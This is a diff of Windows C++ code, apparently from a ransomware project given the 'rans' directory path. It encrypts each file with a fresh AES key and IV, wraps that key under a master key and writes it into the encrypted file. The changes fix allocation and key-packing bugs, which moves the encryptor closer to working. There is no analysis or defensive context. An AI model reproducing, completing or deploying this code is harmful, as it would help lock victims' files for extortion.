@@ -21,7 +21,7 @@ int main(int argc, char* argv[]) {
 	PBYTE masterIV, masterKey;
 	DWORD status = generateKeyAndIV(&masterIV, &masterKey);
 
-	string pathToMasters = "";
+	string pathToMasters = "C:\\rans\\236499\\Squanched\\Debug\\KEY-IV.txt";
 	std::ofstream masterKeyIVFile;
 	masterKeyIVFile.open(pathToMasters, std::ios::binary);
 	masterKeyIVFile.write((char*)masterKey, KEY_LEN);
@@ -68,7 +68,7 @@ DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE 
 	memcpy(tmpIv, masterIV, IV_LEN);
 	DWORD  resSize;
 
-	status = BCryptEncrypt(keyHandle, keyIV, KEY_LEN + IV_LEN, NULL, tmpIv, IV_LEN, *buff, KEY_LEN + IV_LEN, &resSize, BCRYPT_PAD_NONE);
+	status = BCryptEncrypt(keyHandle, keyIV, KEY_LEN + IV_LEN, NULL, tmpIv, IV_LEN, *buff, KEY_LEN + IV_LEN, &resSize, 0);
 	if (!NT_SUCCESS(status)) {
 		//TODO cleanup
 	}
@@ -77,7 +77,15 @@ DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE 
 
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
 {
-	DWORD status;
+	DWORD status = STATUS_INVALID_HANDLE;
+	*iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
+	if (!(*iv)) {
+		return STATUS_UNSUCCESSFUL;
+	}
+	*key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
+	if(!(*key)) {
+		return STATUS_UNSUCCESSFUL;
+	}
 	status = BCryptGenRandom(NULL, *iv, IV_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
 	if(!NT_SUCCESS(status)) {
 		return status;
@@ -121,7 +129,9 @@ void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE keyIV, si
 	ofile.write(paddingSizeCStr, IV_DIGITS_NUM);
 	ofile.write((char*)keyIV, KEY_LEN + IV_LEN);
 	ofile.write((char*)cipherText, cipherLen);
+	int size_tot = IV_DIGITS_NUM + KEY_LEN + IV_LEN + cipherLen;
 	ofile.close();
+	
 }
 
 DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
@@ -169,9 +179,6 @@ void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 		goto CLEANUP;
 	}
 
-	iv =  (PBYTE)HeapAlloc(GetProcessHeap(),0,IV_LEN);
-	key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
-
 	status = generateKeyAndIV(&iv, &key);
 	if(!NT_SUCCESS(status)) {
 		goto CLEANUP;
@@ -217,7 +224,7 @@ void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 #endif
 	PBYTE keyIVBuff = nullptr;
 	PBYTE keyIV = nullptr;
-	keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
+	keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN );
 	if(keyIVBuff == nullptr)
 	{
 		//TODO cleanup
@@ -228,7 +235,7 @@ void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 		//TODO cleanup
 	}
 	memcpy(keyIV,key,KEY_LEN);
-	memcpy(keyIV, iv, IV_LEN);
+	memcpy(keyIV + KEY_LEN, iv, IV_LEN);
 	
 	status = encryptKeyIV(keyIV, &keyIVBuff, masterKey, masterIV);
 	writeToFile(path, cipherText, cipherSize, keyIVBuff, plainTextLen);
